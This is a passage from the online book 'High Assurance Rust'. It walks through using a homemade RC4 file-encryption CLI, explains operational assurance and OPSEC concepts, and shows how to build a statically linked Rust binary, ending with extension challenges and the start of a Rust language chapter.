<p><strong>Valid hex key bytes:</strong> <code>.expect("Invalid key hex byte!")</code> determines the error message thrown if the program receives an invalid string representation of a base-16 byte in the key input (e.g. <code>"0xfg"</code>).</p>
</li>
<li>
<p><strong>Necessary file permissions:</strong> <code>std::fs</code> uses OS facilities to ensure the user has permissions to read and write the file provided. If they don't, our program will throw an error - similar to the <code>Error: Os { code: 2, kind: NotFound...</code> case we saw earlier.</p>
</li>
</ol>
</li>
</ul>
<blockquote>
<p><strong>What should we do if validation fails?</strong></p>
<p>That depends on operational context.
By terminating our CLI tool with an actionable error message as early as possible, we're practicing <strong>offensive programming</strong>:</p>
<ul>
<li>We consider failing early to be an effective first line of defense. We believe there's benefit to never tolerating certain errors.</li>
</ul>
<p>If our file encryption logic had been part of a networked service or protocol, we'd likely prioritize <strong>availability</strong> - keeping the system online and reachable.
<strong>Defensive programming</strong> would be more appropriate:</p>
<ul>
<li>We'd recover from failures with minimal disruption to the end-user.</li>
</ul>
<p>That could mean returning an error (via status code or protocol message) and immediately reverting to listening for new file encryption requests.
Instead of terminating.</p>
</blockquote>
<h2 id="using-the-tool"><a class="header" href="#using-the-tool">Using the Tool</a></h2>
<p>First, let's install our tool so that we can use it like any other command-line utility.
From the <code>crypto_tool/rcli</code> directory, run:</p>
<pre><code class="language-ignore">cargo install --path .
</code></pre>
<p>You should now be able to run <code>rcli --help</code>.
If you want to know where the actual compiled binary is located, run <code>which rcli</code>.</p>
<p>To try out the tool, create a text file with a secret message:</p>
<pre><code class="language-ignore">echo "This is a secret, don't tell anyone!" &gt; secret.txt
</code></pre>
<p>We can use <code>cat</code> to verify the contents:</p>
<pre><code class="language-ignore">$ cat secret.txt
This is a secret, don't tell anyone!
</code></pre>
<p>The contents will no longer be printable after we encrypt.
So let's view them with <code>xxd</code> now:</p>
<pre><code class="language-ignore">$ xxd -g 1 secret.txt
00000000: 54 68 69 73 20 69 73 20 61 20 73 65 63 72 65 74  This is a secret
00000010: 2c 20 64 6f 6e 27 74 20 74 65 6c 6c 20 61 6e 79  , don't tell any
00000020: 6f 6e 65 21 0a                                   one!.
</code></pre>
<p><code>xxd</code> displayed three columns:</p>
<ol>
<li><strong>Left:</strong> the hexadecimal offset into the file.</li>
<li><strong>Middle:</strong> the raw contents of the file as a sequence of hexadecimal bytes.</li>
<li><strong>Right:</strong> the ASCII<sup class="footnote-reference" id="fr-ASCII-1"><a href="#footnote-ASCII">11</a></sup> decoding of the raw bytes (our secret message).</li>
</ol>
<p>The <code>-g 1</code> flag makes each byte stand alone in that middle column.</p>
<p>Let's encrypt the file:</p>
<pre><code class="language-ignore">rcli -f secret.txt -k 01 02 03 04 05
</code></pre>
<p>You should see the output <code>Processed secret.txt</code>.
If we run <code>xxd -g 1 secret.txt</code> again:</p>
<pre><code class="language-ignore">00000000: e6 51 0a 76 d0 54 b3 07 ad e3 21 2f 69 63 7d dc  .Q.v.T....!/ic}.
00000010: 45 a2 f0 20 76 db f6 f5 fd a1 6f c8 5a 6c 67 60  E.. v.....o.Zlg`
00000020: d9 e1 1d e3 87                                   .....
</code></pre>
<p>The bytes have changed because the file has been encrypted.
Our rightmost column doesn't look like a sensible ASCII string anymore.
Verify that you can decrypt the file and retrieve the original message by running <code>rcli</code> again.</p>
<blockquote>
<p><strong>Could our tool print "encrypting" or "decrypting" when processing the file?</strong></p>
<p>As you've seen, encryption and decryption are really the same operation.
We're XOR-ing with the keystream either way.
In order to print a user-friendly message indicating if we've just hidden data or revealed it, we need to know the starting state of the file.</p>
<p>Turns out that's not a trivial task!
You have to bridge the "semantic gap" to determine if an arbitrary sequence of bytes is or isn't an encrypted file.
That's part of this chapter's challenge.</p>
</blockquote>
<h2 id="major-checkpoint"><a class="header" href="#major-checkpoint">Major Checkpoint</a></h2>
<p>We wrote a portable, memory-safe RC4 library and validated it against official test vectors.
It can be used anywhere, even bare metal embedded systems.</p>
<p>Leveraging the <code>clap</code> crate and Rust's standard library, we then built a simple RC4 CLI tool.
Our tool can be compiled for any major OS.</p>
<p>All in only 171 lines of code.
Including all tests and implementing the cryptography <em>from scratch</em>.
And that code is natively compiled - <code>rcli</code> is blazing fast.
Not bad for your first Rust program.</p>
<p>Take a second to soak it in.
You've already come quite far.
When you're ready, we can close out this chapter with one last topic: operational assurance.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-StdEnv">
<p><a href="https://doc.rust-lang.org/std/env/index.html"><em>Module <code>std::env</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-StdEnv-1">↩</a></p>
</li>
<li id="footnote-StdFs">
<p><a href="https://doc.rust-lang.org/std/fs/index.html"><em>Module <code>std::fs</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-StdFs-1">↩</a></p>
</li>
<li id="footnote-Clap">
<p><a href="https://docs.rs/clap/3.0.7/clap/"><em>Crate <code>clap</code></em></a>. <code>clap-rs</code> Project (Accessed 2022). <a href="#fr-Clap-1">↩</a> <a href="#fr-Clap-2">↩2</a></p>
</li>
<li id="footnote-Owo">
<p><a href="https://docs.rs/owo-colors/3.2.0/owo_colors/"><em>Crate <code>owo-colors</code></em></a>. jam1garner (Accessed 2022). <a href="#fr-Owo-1">↩</a></p>
</li>
<li id="footnote-AssertCmd">
<p><a href="https://docs.rs/assert_cmd/latest/assert_cmd/"><em>Crate <code>assert_cmd</code></em></a>. Ed Page (Accessed 2022). <a href="#fr-AssertCmd-1">↩</a></p>
</li>
<li id="footnote-Tui">
<p><a href="https://docs.rs/tui/0.16.0/tui/"><em>Crate <code>tui</code></em></a>. Florian Dehau (Accessed 2022). <a href="#fr-Tui-1">↩</a></p>
</li>
<li id="footnote-SemVer">
<p><a href="https://semver.org/"><em>Semantic Versioning 2.0.0</em></a>. Tom Preston-Werner (Accessed 2022). <a href="#fr-SemVer-1">↩</a></p>
</li>
<li id="footnote-RustDoc">
<p><a href="https://doc.rust-lang.org/rustdoc/what-is-rustdoc.html"><em>What is rustdoc?</em></a>. <a href="#fr-RustDoc-1">↩</a></p>
</li>
<li id="footnote-IORes">
<p><a href="https://doc.rust-lang.org/std/io/type.Result.html"><em>Type Definition <code>std::io::Result</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-IORes-1">↩</a></p>
</li>
<li id="footnote-Unit">
<p><a href="https://doc.rust-lang.org/std/primitive.unit.html"><em>Primitive Type unit</em></a>. The Rust Team (Accessed 2022). <a href="#fr-Unit-1">↩</a></p>
</li>
<li id="footnote-ASCII">
<p><a href="https://en.wikipedia.org/wiki/ASCII"><em>ASCII</em></a>. Wikipedia (Accessed 2022). <a href="#fr-ASCII-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="operational-assurance-1-of-2"><a class="header" href="#operational-assurance-1-of-2">Operational Assurance (1 of 2)</a></h1>
<p>Unfavorably comparing software engineering to civil engineering has become something of a cliche.
The oft-posed provocation is along the lines of:</p>
<blockquote>
<p>If we can reliably build correct bridges, such that they don't collapse out from under us when we cross them, how come we can't reliably write correct desktop applications, such that they don't crash or contain security holes?</p>
</blockquote>
<p>The implication is that civil engineers continually meet stringent standards, while software engineers can't achieve the same mastery of craft.
This line of reasoning seems convincing on the surface.
We've all used buggy software, but few of us have ever seen a bridge collapse<sup class="footnote-reference" id="fr-PGH-1"><a href="#footnote-PGH">1</a></sup>.</p>
<p>Don't worry, us software folks can still save face.
The argument has at least two flaws:</p>
<ul>
<li>
<p><strong>It ignores the malicious actor.</strong> Software is under relentless attack, potentially by skilled adversaries. Be it a power user seeking to jailbreak a device or a cyber criminal attempting to monetize a malware campaign. Withstanding these adversaries is a fundamental design requirement for any networked system. Bridges, on the other hand, don't need to be resistant to demolition crews or arsonists by design.</p>
</li>
<li>
<p><strong>It relies on a false equivalence.</strong> Recall our mention of "state explosion" in static analysis: software has unique combinatorial complexity. Moreover, software libraries and frameworks change at a much faster pace than construction materials and architectural techniques. A bridge requires maintenance over a time span measured in years, but a software system can add new functionality in two week sprints. This dynamic complexity only heightens security and reliability risk.</p>
</li>
</ul>
<p>Thus far, this chapter has treated software assurance like building a really sturdy bridge.
Outside of discussing memory safety and general correctness, we haven't addressed what it actually takes to combat malicious actors in the real world (akin to the first flaw above).
We've also implicitly assumed that security is a stationary target (akin to the second flaw above).</p>
<h2 id="the-bigger-picture"><a class="header" href="#the-bigger-picture">The Bigger Picture</a></h2>
<p>Static analysis and dynamic testing are purely preventative measures.
In reality, most software requires on-going, in-field security support.
Satisfying Rust's pedantic compiler, undergoing manual review, and passing an exhaustive dynamic test suite - these are all just prerequisites to <em>shipping</em> high assurance products.</p>
<p>Once running in a production environment, those products need to be <em>supported</em> for the entirety of their lifecycles.
<strong>Operational assurance</strong> becomes the name of the game.
We need to be able to respond to malicious actors in a constantly changing environment.</p>
<blockquote>
<p><strong>Are we talking about OPSEC?</strong></p>
<p><strong>Operational Security (OPSEC)</strong> was originally a Vietnam-era military term<sup class="footnote-reference" id="fr-OpSec-1"><a href="#footnote-OpSec">2</a></sup>.
In modern IT parlance, it refers broadly to measures which prevent sensitive information from leaking to adversaries.
Consider password management as an example:</p>
<ul>
<li>
<p><strong>Re-use the same, easy-to-remember password across multiple sites?</strong></p>
<ul>
<li>
<p>That's <strong>bad OPSEC</strong>, you're leaking valid credentials to otherwise isolated systems.</p>
</li>
<li>
<p>If any single site doesn't use password storage best practices (salted hash<sup class="footnote-reference" id="fr-PassCheat-1"><a href="#footnote-PassCheat">3</a></sup>, etc) and gets compromised, an attacker could reuse your password to hijack several of your accounts (assuming email/username reuse).</p>
</li>
</ul>
</li>
<li>
<p><strong>Use a unique, long, and randomly-generated password for each website?</strong></p>
<ul>
<li>
<p>That's <strong>good OPSEC</strong>, you're not leaking credentials.</p>
</li>
<li>
<p>Any single-site breach will have no impact on the security of your other accounts.</p>
</li>
</ul>
</li>
</ul>
<p><strong>Operational assurance</strong> is a broader concept, with goals beyond confidentiality of sensitive data.
You can think of OPSEC as a subset of operational assurance.
Returning to our previous example:</p>
<ul>
<li>
<p><strong>Always enable Multi-Factor Authentication (MFA) and review logs in addition to using random, unique passwords?</strong></p>
<ul>
<li>
<p>That's <strong>good operational assurance</strong>. You strengthen authentication, perform historical audits regularly, and protect confidentiality.</p>
</li>
<li>
<p>If you notice login attempts from an IP in an odd geo-location appear in historical data, it could indicate a breach attempt.</p>
</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="breaking-down-operational-assurance"><a class="header" href="#breaking-down-operational-assurance">Breaking Down Operational Assurance</a></h2>
<p>Operational measures run the gambit from "structured logging"<sup class="footnote-reference" id="fr-Log-1"><a href="#footnote-Log">4</a></sup> to "remote attestation"<sup class="footnote-reference" id="fr-RemoteAttest-1"><a href="#footnote-RemoteAttest">5</a></sup>.
It's difficult to capture the entire spread of tools and technologies, so we'll break it down into three broad categories and provide non-exhaustive examples.</p>
<h3 id="system-lifecycle"><a class="header" href="#system-lifecycle">System Lifecycle</a></h3>
<p>Processes and tools for keeping a product or service up-to-date.
Falling under the relatively new umbrella of "DevSecOps"<sup class="footnote-reference" id="fr-DevSecOps-1"><a href="#footnote-DevSecOps">6</a></sup>.
Examples include:</p>
<ul>
<li>Security scanning in Continuous Integration / Continuous Deployment (CI/CD)</li>
<li>Encrypted, authenticated over-the-air firmware update</li>
<li>Versioned, fault-tolerant, distributed infrastructure (e.g. containerized microservices)</li>
<li>Asset inventory</li>
</ul>
<h3 id="host-based-support"><a class="header" href="#host-based-support">Host-based Support</a></h3>
<p>Technologies to protect individual machines, whether clients used by a company's employees or servers running customer-facing services.
Examples include:</p>
<ul>
<li>Sandboxing</li>
<li>Hardened memory allocators</li>
<li>Endpoint Detection and Response (EDR) tooling</li>
<li>Application-specific best-practice configuration</li>
</ul>
<h3 id="network-based-support"><a class="header" href="#network-based-support">Network-based Support</a></h3>
<p>Technologies to protect corporate networks from remote attacks and limit the movement of attackers that do manage to gain a foothold.
Examples include:</p>
<ul>
<li>Secure API gateways</li>
<li>Web Application Firewalls (WAFs)</li>
<li>Security Information and Event Management (SIEM) systems</li>
<li>Virtual Private Network (VPN) infrastructure and Zero-Trust architecture</li>
</ul>
<blockquote>
<p><strong>How does operational assurance relate to our library?</strong></p>
<p>The central focus of this book is writing a robust data structure library.
Easy to lose sight of, with all the ground we cover in early chapters!
Toward the end of our journey, we'll gain practical experience in the system lifecycle component of operational assurance.</p>
<p>By developing bindings that make our library usable from other programming languages, namely C and Python, we'll simulate the process of integrating fast, secure Rust components into an existing codebase.</p>
<p>Maybe you have the opportunity to write new features in Rust for performance reasons.
Or maybe you can incrementally replace security-critical yet memory-unsafe components with Rust equivalents.
Either way, bindings to Rust code allow a team to "harden" (improve the security posture of) a large system over time.</p>
</blockquote>
<h2 id="takeaway-4"><a class="header" href="#takeaway-4">Takeaway</a></h2>
<p>This book is biased toward a "product security" perspective.
The goal of this section is to give you a taste of the bigger picture, the "enterprise security" perspective.
Our discussion of software security wouldn't be complete without this broader context.</p>
<p>The next section will expose you to an application deployment option for a native client, an aspect of the system lifecycle category.
We're going to make our <code>rcli</code> program free-standing, so that it will reliably run for any end-user.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-PGH">
<p>As an aside, an author of this book actually walked across a Pittsburgh bridge less than 24 hours before <a href="https://web.archive.org/web/20220131022216/https://www.nytimes.com/2022/01/28/us/pittsburgh-bridge-collapse-biden.html">its collapse</a>. Aging and poorly maintained infrastructure is a serious problem in the United States, despite the relative wealth of the country. <a href="#fr-PGH-1">↩</a></p>
</li>
<li id="footnote-OpSec">
<p><a href="https://en.wikipedia.org/wiki/Operations_security"><em>Operations security</em></a>. Wikipedia (Accessed 2022). <a href="#fr-OpSec-1">↩</a></p>
</li>
<li id="footnote-PassCheat">
<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"><em>Password Storage Cheat Sheet</em></a>. OWASP Foundation (Accessed 2022). <a href="#fr-PassCheat-1">↩</a></p>
</li>
<li id="footnote-Log">
<p>Logging errors (systems events where some "bad" condition is hit) in a structured format can help you diagnose issues encountered in a production environment. Or more effectively respond to a security incident. <a href="#fr-Log-1">↩</a></p>
</li>
<li id="footnote-RemoteAttest">
<p>Attestation is a process for proving that a specific machine is running a specific set of pre-approved software - not software inserted or modified by an attacker. If you're interested in this topic, you may want to look into what a "Trusted Platform Module" (TPM) does and how it's used by Windows 11. <a href="#fr-RemoteAttest-1">↩</a></p>
</li>
<li id="footnote-DevSecOps">
<p><a href="https://www.redhat.com/en/topics/devops/what-is-devsecops"><em>What is DevSecOps?</em></a>. Redhat (2018). <a href="#fr-DevSecOps-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="operational-assurance-2-of-2"><a class="header" href="#operational-assurance-2-of-2">Operational Assurance (2 of 2)</a></h1>
<p>Time for a tiny bit of client-side operational assurance.
We're going to package this chapter's code so that it "just works" in the field.</p>
<p>We want our <code>rcli</code> tool to run on nearly any Linux system, instantly.
Just by copying a single executable file.
No setup, no pulling in libraries with an OS-specific package manager.
We want it to work for every user, every time.</p>
<blockquote>
<p><strong>Is this section relevant to red teams?</strong></p>
<p>Potentially.
Operational assurance can be thought of as an abstract game played by defenders and attackers.
Likewise, native executables can serve different agendas:</p>
<ul>
<li>
<p><strong>Defense:</strong> Performant, reliable tools for a range of hosts you manage (e.g. "assets").</p>
</li>
<li>
<p><strong>Offense:</strong> Portable programs amenable to obfuscation<sup class="footnote-reference" id="fr-Hellscape-1"><a href="#footnote-Hellscape">1</a></sup>. For hosts owned by your victims (e.g. "targets").</p>
</li>
</ul>
</blockquote>
<h2 id="building-a-free-standing-binary"><a class="header" href="#building-a-free-standing-binary">Building a Free-standing Binary</a></h2>
<p>Static binaries are a tried-and-true way to bundle a program and its dependencies.
They provide an alternative to dynamic linking, a default which locates and loads dependencies at runtime.
Let's briefly visualize the mechanical distinction.</p>
<p>With <strong>dynamic linking</strong>, multiple processes use the same copy of a shared dependency (e.g. shared library).
The shared functions are "resolved" (address to call into is determined) at runtime.
Typically that means on the first call a process makes to a shared function, but it can also be when the process is first "loaded" (e.g. the program is started)<sup class="footnote-reference" id="fr-BindNow-1"><a href="#footnote-BindNow">2</a></sup>.
It's common, but not required, for shared libraries to make system calls - requests to the OS kernel to interact with hardware.
Reading or writing a file requires a system call.</p>
<br>
<p align="center">
  <img width="80%" src="chp2/link_dynamic.svg">
  <figure>
  <figcaption><center>Two dynamically-linked processes with a shared dependency.</center></figcaption><br>
  </figure>
</p>
<p><strong>Static linking</strong> takes all of the executable code needed for a program, including any services typically provided by system libraries, and bakes everything into one larger file.
The result is a stand-alone application.
No need to resolve anything at runtime.
System calls are made directly as necessary.</p>
<br>
<p align="center">
  <img width="80%" src="chp2/link_static.svg">
  <figure>
  <figcaption><center>A statically-linked process and a dynamically-linked process.</center></figcaption><br>
  </figure>
</p>
<blockquote>
<p><strong>Are we making an operational tradeoff?</strong></p>
<p>Yes.
For defenders, static linking complicates patching.
Typically, an OS's package manager keeps system libraries up to date.
And individual programs can link against a single, recent copy of the relevant library.</p>
<p>Static linking means each individual program needs to be replaced to keep its dependencies up to date.
We lose the ability to manage centralized copies of certain components.</p>
<p>If multiple processes rely on the same dependency, then a statically linked process may also mean duplicated code and thus higher RAM usage.</p>
<p>But static linking is great for portability and isn't readily supported by many programming languages.
So let's see how it's done in Rust.</p>
</blockquote>
<p>First, we'll verify that <code>rcli</code> is dynamically linked by default.
From the <code>crypto_tool/rcli</code> directory, run:</p>
<pre><code class="language-ignore">cargo build --release
ldd ../target/release/rcli
</code></pre>
<p><code>ldd</code> is a Linux command for printing shared library dependencies - those the OS distribution typically manages.
So that second command will output something like:</p>
<pre><code class="language-ignore">linux-vdso.so.1 (0x00007ffc0196f000)
libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f09369b9000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0936c8e000)
libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f0936996000)
libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007f093697b000)
libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f0936975000)
</code></pre>
<p>Each line represents a shared object (<code>.so</code> file) that the <code>rcli</code> tool expects to be present somewhere on the filesystem in order to function.</p>
<p>The second item (line starting with <code>libc.so.6</code>) is the C standard library.
Recall from this chapter's intro that our <code>rcli</code> front-end code links against parts of <code>libc</code> (e.g. for dynamic memory allocation).
Although our RC4 library does not (it's a <code>#![no_std]</code> component).</p>
<p>To avoid being reliant on the presence of these libraries, we can compile a static binary that will use <code>musl</code> (a tiny <code>libc</code> alternative<sup class="footnote-reference" id="fr-MUSL-1"><a href="#footnote-MUSL">3</a></sup>) instead:</p>
<pre><code class="language-ignore">rustup target add x86_64-unknown-linux-musl
cargo build --release --target x86_64-unknown-linux-musl
</code></pre>
<ul>
<li>
<p>The first command adds a new compilation target<sup class="footnote-reference" id="fr-PlatformSupport-1"><a href="#footnote-PlatformSupport">4</a></sup>, which is generally specified by a "target triple" in the form <code>{Arch}-{Vendor}-{Sys}-{ABI}</code>.</p>
</li>
<li>
<p>The second command builds <code>rcli</code> as before, but this time for the target triple <code>x86_64-unknown-linux-musl</code>.</p>
</li>
</ul>
<p>Now let's try <code>ldd</code> again, this time on the <code>musl</code>-target binary:</p>
<pre><code class="language-ignore">ldd ../target/x86_64-unknown-linux-musl/release/rcli
</code></pre>
<p>The output should be:</p>
<pre><code class="language-ignore">statically linked
</code></pre>
<p>Our second build of the <code>rcli</code> executable will "just work" on any x86_64 Linux system!
All you need to do is copy over the binary.</p>
<h2 id="stripping-debug-info"><a class="header" href="#stripping-debug-info">Stripping Debug Info</a></h2>
<p>If we want to distribute this executable, we should reduce its size by removing debug information (including symbols that allow matching to source code, something a CLI end-user won't need to do).</p>
<p>We can "strip" the binary of this information by adding the following <code>release</code> profile setting to the workspace's configuration file, <code>crypto_tool/Cargo.toml</code>:</p>
<pre><code class="language-ignore">[profile.release]
strip = true
</code></pre>
<p>The setting applies to any target built with the flag <code>--release</code> (which enables optimizations).
We could've also used <code>strip</code><sup class="footnote-reference" id="fr-Strip-1"><a href="#footnote-Strip">5</a></sup>, a standalone Linux utility, but we leveraged <code>cargo</code> to more cleanly integrate into the build pipeline.</p>
<blockquote>
<p><strong>An Alternative to <code>musl</code></strong></p>
<p>Though leveraging <code>musl</code> is a popular way to build small-ish static binaries, <code>musl</code> has its quirks.
Particularly with regard to performance.</p>
<p>To statically link your platform's standard C runtime ("CRT") instead<sup class="footnote-reference" id="fr-RFC-1"><a href="#footnote-RFC">6</a></sup>:</p>
<pre><code class="language-ignore">RUSTFLAGS='-C target-feature=+crt-static' cargo build --release --target x86_64-unknown-linux-gnu
</code></pre>
<p>Warning: unlike the <code>musl</code> route, the resulting binary might still be dynamic linked against something like <code>vdso</code><sup class="footnote-reference" id="fr-VDSO-1"><a href="#footnote-VDSO">7</a></sup>. You can use <code>ldd</code> to verify.</p>
</blockquote>
<h2 id="takeaway-5"><a class="header" href="#takeaway-5">Takeaway</a></h2>
<p>We've demonstrated building a completely free-standing tool.
Our binary will run natively, on nearly any client of given OS and ISA<sup class="footnote-reference" id="fr-ISA-1"><a href="#footnote-ISA">8</a></sup>.</p>
<p>That concludes our tour of software assurance!
In the next chapter, we'll dig into Rust proper.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-Hellscape">
<p><a href="https://github.com/meme/hellscape"><em><code>hellscape</code></em></a>. meme (Archived 2021). <a href="#fr-Hellscape-1">↩</a></p>
</li>
<li id="footnote-BindNow">
<p><a href="https://man7.org/linux/man-pages/man8/ld.so.8.html"><em><code>ld.so</code></em></a>. Linux manual (Accessed 2022). On Linux, this behavior can be activated by setting the <code>LD_BIND_NOW</code> environment variable to a non-empty string. The advantage of doing shared function resolution at load-time is slightly more predictable runtime performance. May also be useful for process debugging. <a href="#fr-BindNow-1">↩</a></p>
</li>
<li id="footnote-MUSL">
<p><a href="https://musl.libc.org/"><em>musl libc</em></a>. Rich Felker and contributors (Accessed 2022). <a href="#fr-MUSL-1">↩</a></p>
</li>
<li id="footnote-PlatformSupport">
<p><a href="https://doc.rust-lang.org/nightly/rustc/platform-support.html"><em>Platform Support</em></a>. The Rust Team (Accessed 2022). <a href="#fr-PlatformSupport-1">↩</a></p>
</li>
<li id="footnote-Strip">
<p><a href="https://man7.org/linux/man-pages/man1/strip.1.html"><em><code>strip</code></em></a>. Linux manual (Accessed 2022). <a href="#fr-Strip-1">↩</a></p>
</li>
<li id="footnote-RFC">
<p><a href="https://rust-lang.github.io/rfcs/1721-crt-static.html"><em>RFC 1721</em></a>. The Rust RFC Book (Accessed 2022). <a href="#fr-RFC-1">↩</a></p>
</li>
<li id="footnote-VDSO">
<p><a href="https://man7.org/linux/man-pages/man7/vdso.7.html"><em><code>vdso</code></em></a>. Linux manual (Accessed 2022). <a href="#fr-VDSO-1">↩</a></p>
</li>
<li id="footnote-ISA">
<p>Instruction Set Architecture, e.g. x86_64. <a href="#fr-ISA-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="hands-on-challenge-extend-the-cli-encryption-tool"><a class="header" href="#hands-on-challenge-extend-the-cli-encryption-tool">Hands-on Challenge: Extend the CLI Encryption Tool</a></h1>
<p>The <code>rcli</code> tool we wrote in this chapter is rather basic.
That's by design, it was a short showcase of Rust's features and tooling.</p>
<p>The goal of our first challenge is to extend this CLI encryption tool.
Some readers may prefer to tackle this challenge after finishing the next chapter, which introduces the Rust language in a more structured fashion.
Others may be itching to write code right now, and willing to pick up more Rust as they go.</p>
<p>Below are several suggestions for extending the tool.
You may choose one or more.
Feel free to implement your own ideas as well!</p>
<h2 id="core-cryptography"><a class="header" href="#core-cryptography">Core Cryptography</a></h2>
<ul>
<li>
<p>Switch the encryption algorithm from our RC4 implementation to a modern AEAD cipher of your choosing. Making a choice will require some research into the pros and cons of various ciphers.</p>
<ul>
<li>
<p>The RustCrypto organization maintains several AEAD algorithm implementations<sup class="footnote-reference" id="fr-AEADList-1"><a href="#footnote-AEADList">1</a></sup>, but you may find other mature libraries suitable.</p>
</li>
<li>
<p>The threat model for a hardware product may include an attacker with 24/7 physical access to a device. Can you find an algorithm and implementation that makes guarantees about timing and power side-channel resistance?<sup class="footnote-reference" id="fr-SideChannel-1"><a href="#footnote-SideChannel">2</a></sup></p>
</li>
</ul>
</li>
</ul>
<h2 id="cli-ux"><a class="header" href="#cli-ux">CLI UX</a></h2>
<ul>
<li>
<p>Add the ability for a user to create a new encrypted file instead of overwriting an existing file. If the user opts to overwrite an existing file, present a color-coded warning (you will want to choose a 3rd party library for coloring terminal output).</p>
</li>
<li>
<p>Add the ability to recursively encrypt every file in a directory (be very careful when testing this, you'll likely want to create a new directory with dummy files!).</p>
</li>
<li>
<p>Instead of printing <code>Processed {file_name}</code> to the console, update the tool to print either <code>Encrypted {file_name}</code> or <code>Decrypted {file_name}</code> (hint: is there a heuristic you can test to identify encrypted byte streams?).</p>
</li>
<li>
<p>Support encryption of files too large to read into memory at once, via buffering.</p>
</li>
</ul>
<h2 id="cli-integration-testing"><a class="header" href="#cli-integration-testing">CLI Integration Testing</a></h2>
<ul>
<li>
<p>Add an integration test that runs your CLI binary, providing both command line arguments and temporary files to encrypt or decrypt. You'll likely want to use one or more 3rd party libraries to set up your test harness.</p>
</li>
<li>
<p>Negative tests, meaning those that check for graceful handling of invalid inputs, are a critical part of security testing. Ensure that your integration harness explicitly checks such cases.</p>
</li>
</ul>
<br>
<hr>
<ol class="footnote-definition"><li id="footnote-AEADList">
<p><a href="https://github.com/RustCrypto/AEADs"><em>RustCrypto: Authenticated Encryption with Associated Data (AEAD) Algorithms</em></a>. RustCrypto organization (Accessed 2022). <a href="#fr-AEADList-1">↩</a></p>
</li>
<li id="footnote-SideChannel">
<p>Side-channel attacks leverage information <em>leaked</em> by a physical system (timing, power consumption, electromagnetic emissions, acoustic emissions, etc) to compromise security. In the context of cryptography, this often means extracting secret key material via an indirect means (no software bugs exploited!). Some cryptographic algorithms are designed with this threat model in mind. Their operations are carefully constructed to reduce any externally observable variance, making side-channel attacks significantly more difficult or outright impractical. <a href="#fr-SideChannel-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="rust-zero-crash-course"><a class="header" href="#rust-zero-crash-course">Rust Zero-Crash Course</a></h1>
<hr />
<blockquote>
<p><strong>Note:</strong> this chapter's content may be subject to revision.</p>
</blockquote>
<p>The prior chapter walked through a Rust library and CLI tool in the service of introducing software security concepts.
This chapter will focus on the Rust language proper - we'll tour its syntax, features, and conventions.</p>
<p>Now we won't be covering all of Rust.
It's a <em>big</em> language.
Much closer to C++ than C.
Our favorite comprehensive Rust book, <em>Programming Rust</em><sup class="footnote-reference" id="fr-ProgRust-1"><a href="#footnote-ProgRust">1</a></sup>, is a 700+ page tome, a relentless enumeration of language features.
Now it's a phenomenal book, and a major inspiration for this one.
But we're talking multiple-Costco-mini-barrels-of-whole-bean-coffee kinds of endurance.</p>
<p>Part of the challenge is the sheer breadth of features Rust offers.
Being a relatively new language, Rust has the benefit of hindsight: it's free to cherry-pick successful aspects of its predecessors.</p>
<p>This includes OCaml's algebraic data types, C++'s monomorphization, Scheme's hygienic macros, etc<sup class="footnote-reference" id="fr-RustInfluences-1"><a href="#footnote-RustInfluences">2</a></sup>.
